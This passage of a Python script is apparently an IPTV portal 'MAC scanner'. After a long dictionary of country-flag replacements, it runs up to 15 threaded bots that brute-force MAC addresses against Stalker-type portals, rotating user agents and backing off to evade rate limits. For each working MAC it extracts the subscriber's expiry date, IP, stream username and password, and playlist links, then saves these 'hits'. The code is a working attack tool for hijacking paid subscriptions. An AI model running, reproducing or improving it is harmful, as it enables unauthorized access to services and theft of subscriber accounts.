        " GY/": " 🇬🇾 GY ",
        " HT/": " 🇭🇹 HT ",
        " HM/": " 🇭🇲 HM ",
        " VA/": " 🇻🇦 VA ",
        " HN/": " 🇭🇳 HN ",
        " HK/": " 🇭🇰 HK ",
        " HU/": " 🇭🇺 HU ",
        " IS/": " 🇮🇸 IS ",
        " IN/": " 🇮🇳 IN ",
        " ID/": " 🇮🇩 ID ",
        " IR/": " 🇮🇷 IR ",
        " IQ/": " 🇮🇶 IQ ",
        " IE/": " 🇮🇪 IE ",
        " IM/": " 🇮🇲 IM ",
        " IL/": " 🇮🇱 IL ",
        " IT/": " 🇮🇹 IT ",
        " JM/": " 🇯🇲 JM ",
        " JP/": " 🇯🇵 JP ",
        " JE/": " 🇯🇪 JE ",
        " JO/": " 🇯🇴 JO ",
        " KZ/": " 🇰🇿 KZ ",
        " KE/": " 🇰🇪 KE ",
        " KI/": " 🇰🇮 KI ",
        " KP/": " 🇰🇵 KP ",
        " KR/": " 🇰🇷 KR ",
        " KW/": " 🇰🇼 KW ",
        " KG/": " 🇰🇬 KG ",
        " TO/": " 🇹🇴 TO ",
        " LA/": " 🇱🇦 LA ",
        " LV/": " 🇱🇻 LV ",
        " LB/": " 🇱🇧 LB ",
        " LS/": " 🇱🇸 LS ",
        " LR/": " 🇱🇷 LR ",
        " LY/": " 🇱🇾 LY ",
        " LI/": " 🇱🇮 LI ",
        " TL/": " 🇹🇱 TL ",
        " TG/": " 🇹🇬 TG ",
        " TK/": " 🇹🇰 TK ",
        " MG/": " 🇲🇬 MG ",
        " MW/": " 🇲🇼 MW ",
        " MY/": " 🇲🇾 MY ",
        " MV/": " 🇲🇻 MV ",
        " ML/": " 🇲🇱 ML ",
        " MT/": " 🇲🇹 MT ",
        " MH/": " 🇲🇭 MH ",
        " MQ/": " 🇲🇶 MQ ",
        " MR/": " 🇲🇷 MR ",
        " MU/": " 🇲🇺 MU ",
        " YT/": " 🇾🇹 YT ",
        " MX/": " 🇲🇽 MX ",
        " FM/": " 🇫🇲 FM ",
        " MD/": " 🇲🇩 MD ",
        " MC/": " 🇲🇨 MC ",
        " MN/": " 🇲🇳 MN ",
        " ME/": " 🇲🇪 ME ",
        " MS/": " 🇲🇸 MS ",
        " MA/": " 🇲🇦 MA ",
        " MZ/": " 🇲🇿 MZ ",
        " MM/": " 🇲🇲 MM ",
        " NA/": " 🇳🇦 NA ",
        " NR/": " 🇳🇷 NR ",
        " NP/": " 🇳🇵 NP ",
        " NL/": " 🇳🇱 NL ",
        " NC/": " 🇳🇨 NC ",
        " NZ/": " 🇳🇿 NZ ",
        " NI/": " 🇳🇮 NI ",
        " NE/": " 🇳🇪 NE ",
        " NG/": " 🇳🇬 NG ",
        " NU/": " 🇳🇺 NU ",
        " NF/": " 🇳🇫 NF ",
        " MP/": " 🇲🇵 MP ",
        " NO/": " 🇳🇴 NO ",
        " OM/": " 🇴🇲 OM ",
        " PK/": " 🇵🇰 PK ",
        " PW/": " 🇵🇼 PW ",
        " PS/": " 🇵🇸 PS ",
        " PA/": " 🇵🇦 PA ",
        " PG/": " 🇵🇬 PG ",
        " PY/": " 🇵🇾 PY ",
        " PE/": " 🇵🇪 PE ",
        " PH/": " 🇵🇭 PH ",
        " PN/": " 🇵🇳 PN ",
        " PL/": " 🇵🇱 PL ",
        " PT/": " 🇵🇹 PT ",
        " PR/": " 🇵🇷 PR ",
        " QA/": " 🇶🇦 QA ",
        " RE/": " 🇷🇪 RE ",
        " RO/": " 🇷🇴 RO ",
        " RUS/": " 🇷🇺 RUS ",
        " RW/": " 🇷🇼 RW ",
        " BL/": " 🇧🇱 BL ",
        " SH/": " 🇸🇭 SH ",
        " KN/": " 🇰🇳 KN ",
        " LC/": " 🇱🇨 LC ",
        " MF/": " 🇲🇫 MF ",
        " PM/": " 🇵🇲 PM ",
        " VC/": " 🇻🇨 VC ",
        " WS/": " 🇼🇸 WS ",
        " SM/": " 🇸🇲 SM ",
        " ST/": " 🇸🇹 ST ",
        " SA/": " 🇸🇦 SA ",
        " SN/": " 🇸🇳 SN ",
        " RS/": " 🇷🇸 RS ",
        " SC/": " 🇸🇨 SC ",
        " SL/": " 🇸🇱 SL ",
        " SG/": " 🇸🇬 SG ",
        " SX/": " 🇸🇽 SX ",
        " SK/": " 🇸🇰 SK ",
        " SI/": " 🇸🇮 SI ",
        " SB/": " 🇸🇧 SB ",
        " SO/": " 🇸🇴 SO ",
        " ZA/": " 🇿🇦 ZA ",
        " GS/": " 🇬🇸 GS ",
        " SS/": " 🇸🇸 SS ",
        " ES/": " 🇪🇸 ES ",
        " LK/": " 🇱🇰 LK ",
        " SD/": " 🇸🇩 SD ",
        " SR/": " 🇸🇷 SR ",
        " SJ/": " 🇸🇯 SJ ",
        " SZ/": " 🇸🇿 SZ ",
        " SE/": " 🇸🇪 SE ",
        " CH/": " 🇨🇭 CH ",
        " SY/": " 🇸🇾 SY ",
        " TW/": " 🇹🇼 TW ",
        " TJ/": " 🇹🇯 TJ ",
        " TZ/": " 🇹🇿 TZ ",
        " TH/": " 🇹🇭 TH ",
        " TT/": " 🇹🇹 TT ",
        " TN/": " 🇹🇳 TN ",
        " TR/": " 🇹🇷 TR ",
        " TM/": " 🇹🇲 TM ",
        " TC/": " 🇹🇨 TC ",
        " UG/": " 🇺🇬 UG ",
        " UA/": " 🇺🇦 UA ",
        " AE/": " 🇦🇪 AE ",
        " GB/": " 🇬🇧 GB ",
        " USA/": " 🇺🇸 USA ",
        " UM/": " 🇺🇲 UM ",
        " UY/": " 🇺🇾 UY ",
        " UZ/": " 🇺🇿 UZ ",
        " VU/": " 🇻🇺 VU ",
        " VE/": " 🇻🇪 VE ",
        " VN/": " 🇻🇳 VN ",
        " VI/": " 🇻🇮 VI ",
        " WF/": " 🇼🇫 WF ",
        " EH/": " 🇪🇭 EH ",
        " YE/": " 🇾🇪 YE ",
        " ZM/": " 🇿🇲 ZM ",
        " ZW/": " 🇿🇼 ZW ",
        " ROU/": " 🇷🇴 ROU ",
        " SRB/": " 🇷🇸 SRB ",
        " HRV/": " 🇭🇷 HRV ",
        " BIH/": " 🇧🇦 BIH ",
        " UKA/": " 🇺🇦 UKA ",
        " EU ": " 🇪🇺 EU ",
        " ADULTS ": " 🔞 ADULTS ",
        " Adults ": " 🔞 Adults ",
        " ADULT ": " 🔞 ADULT ",
        " XXX ": " 🔞 XXX ",
        " +18 ": " 🔞 +18 ",
        " Adult ": " 🔞 Adult ",
        " F1 ": " 🏎 F1 ",
        " FORMULA ": " 🏎 FORMULA ",
        " GOLF ": " ⛳ GOLF ",
        " Golf ": " ⛳ Golf ",
        " PGA ": " ⛳ PGA ",
        " APPLE ": " 🍏 APPLE ",
        " Apple ": " 🍏 Apple ",
        " AMAZON ": " 📦 AMAZON ",
        " Amazon ": " 📦 Amazon ",
        " DISNEY ": " 🐥 DISNEY ",
        " DISNEY+ ": " 🐥 DISNEY+ ",
        " Disney ": " 🐥 Disney ",
        " Disney+ ": " 🐥 Disney+ ",
        " NETFLIX ": " 🎞 NETFLIX ",
        " Netflix ": " 🎞 Netflix ",
        " PARAMOUNT ": " 🅿️ PARAMOUNT ",
        " Paramount ": " 🅿️ Paramount ",
        " PARAMOUNT+ ": " 🅿️ PARAMOUNT+ ",
        " Paramount+ ": " 🅿️ Paramount+ ",
        " Discovery ": " 📽 Discovery ",
        " DISCOVERY ": " 📽 DISCOVERY ",
        " HORSE ": " 🏇 HORSE ",
        " NBA ": " 🏀 NBA ",
        " WNBA ": " 🏀 WNBA ",
        " FIBA ": " 🏀 FIBA ",
        " NBA.": " 🏀 NBA.",
        " NFL.": " 🏈 NFL.",
        " NFL ": " 🏈 NFL ",
        " NCAAF ": " 🏈 NCAAF ",
        " NHL ": " 🏒 NHL ",
        " NHL.": " 🏒 NHL.",
        " MLB ": " ⚾️ MLB ",
        " MLB.": " ⚾️ MLB.",
        " NCAA ": " ⚾️ NCAA ",
        " MLS ": " ⚽️ MLS ",
        " BUNDESLIGA ": " ⚽️ BUNDESLIGA ",
        " Bundesliga ": " ⚽️ Bundesliga ",
        " TENNIS ": " 🥍 TENNIS ",
        " Tennis ": " 🥍 Tennis ",
        " Dart ": " 🎯 Dart ",
        " DART ": " 🎯 DART ",
        " WORLD ": " 🌍 WORLD ",
        " Music ": " 🎵 Music ",
        " MUSIC ": " 🎵 MUSIC ",
        " WEIHNACHTEN ": " 🎅 WEIHNACHTEN ",
        " Weihnachten ": " 🎅 Weihnachten ",
        " Christmas ": " 🎅 Christmas ",
        " CHRISTMAS ": " 🎅 CHRISTMAS ",
        " HALLOWEEN ": " 🎃 HALLOWEEN ",
        " Halloween ": " 🎃 Halloween ",
        "NETHERLANDS": "🇳🇱 NETHERLANDS",
        "PORTUGUESE": "🇵🇹 PORTUGUESE",
        "POLAND": "🇵🇱 POLAND",
        "RUSSIAN": "🇷🇺 RUSSIAN",
        "ALBANIA": "🇦🇱 ALBANIA",
        "ARABIC": "🇸🇦 ARABIC",  # Assuming Arabic refers to Saudi Arabia
        "ROMANIA": "🇷🇴 ROMANIA",
        "GREEK": "🇬🇷 GREEK",
        "FINLAND": "🇫🇮 FINLAND",
        "NORWAY": "🇳🇴 NORWAY",
        "IRAN": "🇮🇷 IRAN",
        "FRANCE": "🇫🇷 FRANCE",
        "GERMANY": "🇩🇪 GERMANY",
        "INDIA": "🇮🇳 INDIA",
        "ITALIA": "🇮🇹 ITALIA",
        "DENMARK": "🇩🇰 DENMARK",
        "SPAIN": "🇪🇸 SPAIN",
        "SWEDISH": "🇸🇪 SWEDISH",
        "TURKEY": "🇹🇷 TURKEY",
        "UNITED KINGDOM": "🇬🇧 UNITED KINGDOM"
}


def replace_flags(text):
    for country, flag in country_flags.items():
        text = text.replace(country, flag)
    return text

def url_cid(cid):
    global httpX, panel,portal_idx
    url = httpX + panel + "/" + portal_idx + "?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/" + str(
                                cid) + "_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
    if portal_idx == "stalker_portal/server/load.php":
        url = httpX + panel + "/" + portal_idx + "?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/" + str(
                                    cid) + "&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
    return url

veri = ""
hitoff = 0
unique_macs = set()
# Routine der Scan-Bots
def d(i):
    global hitc, veri, off_m3u_count, ip, live_count, film_count, series_count, link, ses, header__, res
    global hitr, httpX
    global tokenr
    global uagent
    global uagentp
    global user_agents_list, hitoff

    #random_pause = random.uniform(0.5, 5)
    #time.sleep(random_pause)
    for mac in range(i, mac_total, botcount):
        total = mac
        if mac_choice == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
                if mac not in unique_macs:
                    unique_macs.add( mac )
                else:
                    continue
        macs = mac.upper().replace(':', '%3A')
        bot = f"Bot_{i}"
        oran = round((total / mac_total * 100), 2)
        echok(mac, bot, total, hitc, oran, tokenr)

        max_attempts=4
        attempt=1
        while attempt<max_attempts:
            try:
                uagent = random.choice(user_agents_list)
                uagentp = (uagent[0:28]) + '...'
                ses = requests.Session()
                header__ = hea1(mac, uagent)
                #print(header__)
                res = ses.get(url1, headers=header__ , timeout=5, verify=False) #, verify=False
                veri = str(res.text)
                echok(mac, bot, total, hitc, oran, tokenr)
                if str(res.status_code) in ['429', '403']:
                    #print("Received 429 Too Many Requests. Waiting before retrying...")
                    # Implement a backoff strategy (e.g., wait for 1 second, then double the wait time)
                    wait_time = 1*(2 ** attempt)  # Exponential backoff
                    print(f"Waiting for {wait_time} seconds...")
                    time.sleep(wait_time)
                break
            except:
                if str(res.status_code) in ['429', '403']:
                    #print("Received 429 Too Many Requests. Waiting before retrying...")
                    # Implement a backoff strategy (e.g., wait for 1 second, then double the wait time)
                    wait_time = 1*(2 ** attempt)  # Exponential backoff
                    print(f"Waiting for {wait_time} seconds...")
                    time.sleep(wait_time)
                attempt +=1
            finally:
                # Close the session
                ses.close()
        tokenr = "\33[35m"
        if ":null" not in veri: time.sleep(0.5)
        if "token" in veri: # and ":null" not in veri:
            tokenr = "\33[0m"
            # Parse the JSON string into a Python dictionary
            data = json.loads(veri)
            # Access the token value
            token = data['js']['token']
            if token:
                max_attempts = 4
                attempt = 1
                while attempt < max_attempts:
                    try:
                        #ses = requests.Session()
                        res = ses.get(url2, headers=hea2(mac, token, portal_idx), timeout=15)
                        veri = str(res.text)
                        break
                    except:
                        attempt += 1
                        time.sleep(0.5)

                id = "null"
                ip = ""
                expires = ""
                try:
                    id = veri.split('{"js":{"id":')[1]
                    id = id.split(',"country_name": "')[0]
                    ip = veri.split('ip": "')[1]
                    ip = ip.split('"')[0]
                except:
                    pass
                try:
                    expires = str( duzel2( veri, "expires" ) )
                except:
                    pass

                if veri.count('phone') == 0 and veri.count('end_date') == 0 and expires == "":
                    continue
                if id == "null" and expires == "":
                    hitoff += 1
                    continue
                if id != "null" and token is not None:
                    while True:
                        try:
                            res = ses.get(url3, headers=hea2(mac, token, portal_idx), timeout=15)
                            veri = str(res.text)
                            break
                        except:
                            pass
                    if veri.count('phone') == 0 and veri.count(
                            'end_date') == 0 and expires == "":
                        continue

                    #if not veri.count('phone') == 0:
                    if "phone" in veri:
                        #hitr = "\33[1;36m"
                        #hitc = hitc + 1
                        trh = ""
                        if 'end_date' in veri:
                            trh = veri.split('end_date":"')[1]
                            trh = trh.split('"')[0]
                        else:
                            try:
                                trh = veri.split('phone":"')[1]
                                trh = trh.split('"')[0]
                                if trh.lower()[:2] == 'un':
                                    K_Days = " Days"
                                else:
                                    K_Days = (str(tarih_clear(trh)) + " Days")
                                    trh = trh + ' ' + K_Days
                            except:
                                pass
                        is_later = datetime.now()<datetime.strptime(trh, "%B %d, %Y, %I:%M %p")
                        if is_later:
                            hitr = "\33[1;36m"
                            hitc = hitc+1
                        else:
                            hitoff += 1
                            continue
                        hitprint(mac, trh)
                        write_mac_combo(mac)
                        write_all_mac_combo(mac)
                        cid = "1842"
                        max_attempts = 3
                        attempt = 1
                        while attempt < max_attempts:
                            try:
                                res = ses.get(url6, headers=hea2(mac, token, portal_idx), timeout=15, verify=False)
                                veri = str(res.text)
                                if 'total' in veri:
                                    cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                                if portal_idx == "stalker_portal/server/load.php":
                                    cid = (str(res.text).split('id":"')[5].split('"')[0])
                                break
                            except:
                                attempt += 1
                                time.sleep(0.5)
                                cid = "94067"

                        real = panel
                        m3ulink = ""
                        user = ""
                        pas = ""
                        p_message = "Invalid Opps"

                        max_attempts=4
                        attempt=1
                        while attempt<max_attempts:
                            try:
                                res = ses.get(url_cid(cid), headers=hea2(mac, token, portal_idx), timeout=10, verify=False)
                                veri = str(res.text)
                                #####
                                if 'ffmpeg ' in veri:
                                    link = veri.split('ffmpeg ')[1].split('"')[0].replace('\/', '/')
                                else:
                                    if 'cmd":"' in veri:
                                        link = veri.split('cmd":"')[1].split('"')[0].replace('\/', '/')
                                        user = str(link.replace('live/', '').split('/')[3])
                                        pas = str(link.replace('live/', '').split('/')[4])
                                        real = httpX +  link.split('://')[1].split('/')[0] + '/c/'
                                if 'ffmpeg ' in veri:
                                    user = str(link.replace('live/', '').split('/')[3])
                                    pas = str(link.replace('live/', '').split('/')[4])
                                    if real == panel:
                                        real = httpX +  link.split('://')[1].split('/')[0] + '/c/'
                                m3ulink = httpX +  real.replace('http://', '').replace('/c/','') + "/get.php?username=" + str(
                                    user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                                if is_valid_url(m3ulink):
                                    m3ulink = m3ulink
                                else:
                                    m3ulink = "Offline"
                                    off_m3u_count = off_m3u_count + 1
                                p_message = goruntu(link)
                                break
                            except:
                                attempt +=1
                                time.sleep(0.5)

                        playerapi = ""
                        if not m3ulink == "":
                            playerlink = str(httpX + real.replace(httpX, '').replace('/c/',
                                                                                             '') + "/player_api.php?username=" + user + "&password=" + pas)
                            playerapi = m3uapi(playerlink, mac, token)
                            if playerapi == "":
                                playerlink = str(httpX + panel.replace(httpX, '').replace('/c/',
                                                                                                  '') + "/player_api.php?username=" + user + "&password=" + pas)
                                playerapi = m3uapi(playerlink, mac, token)

                        if not ip == "":
                            vpn = vpnip(ip)
                        else:
                            vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                        livelist = ""
                        vodlist = ""
                        serieslist = ""
                        if channel_cat == "1" or channel_cat == "2":
                            listlink = liveurl
                            livel = ' «🔵» '
                            livelist = chlist(listlink, mac, token, livel)
                            livelist = livelist.upper()
                            livelist = livelist.replace("|", " ").replace("{", "").replace(" «🔵»", " ")
                            livelist = replace_flags(livelist)

                        if channel_cat == "2":
                            listlink = vodurl
                            livel = ' «🔴» '
                            vodlist = chlist(listlink, mac, token, livel)
                            vodlist = vodlist.upper()
                            vodlist = vodlist.replace("|", " ").replace("{", "").replace(" «🔴»", " ")
                            vodlist = replace_flags(vodlist)

                            listlink = seriesurl
                            livel = ' «🟡» '
                            serieslist = chlist(listlink, mac, token, livel)
                            serieslist = serieslist.upper()
                            serieslist = serieslist.replace("|", " ").replace("{", "").replace(" «🟡»", " ")
                            serieslist = replace_flags(serieslist)

                        max_attempts=4
                        attempt=1
                        while attempt<max_attempts:
                            try:
                                res = ses.get( url7, headers=hea2( macs, token, portal_idx ), timeout=20, verify=False )
                                veri = str( res.text )
                                live_count = str( veri ).split( 'total_items":' )[1].split( ',"' )[0]
                                break
                            except:
                                attempt +=1

                        max_attempts=4
                        attempt=1
                        while attempt<max_attempts:
                            try:
                                res = ses.get( url8, headers=hea2( macs, token, portal_idx ), timeout=20, verify=False )
                                veri = str( res.text )
                                film_count = str( veri ).split( 'total_items":' )[1].split( ',"' )[0]
                                break
                            except:
                                attempt += 1

                        max_attempts=4
                        attempt=1
                        while attempt<max_attempts:
                            try:
                                res = ses.get( url9, headers=hea2( macs, token, portal_idx ), timeout=20, verify=False )
                                veri = str( res.text )
                                series_count = str( veri ).split( 'total_items":' )[1].split( ',"' )[0]
                                break
                            except:
                                attempt +=1
                        check_panel_info(panel)
                        hit( mac, trh, real, m3ulink, p_message, vpn, livelist, vodlist, serieslist, playerapi, live_count, film_count, series_count )
    #random_pause = random.uniform(0.5, 5)
    #time.sleep(random_pause)

### Erstellen eines Thread-Pools mit  max. 15 Bots
with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    ### Senden bis zu 15 Aufgaben an den Thread-Pool
    futures = [executor.submit(d, i) for i in range(1, botcount + 1)]
    ### Warten bis alle Aufgaben abgeschlossen sind
    concurrent.futures.wait(futures)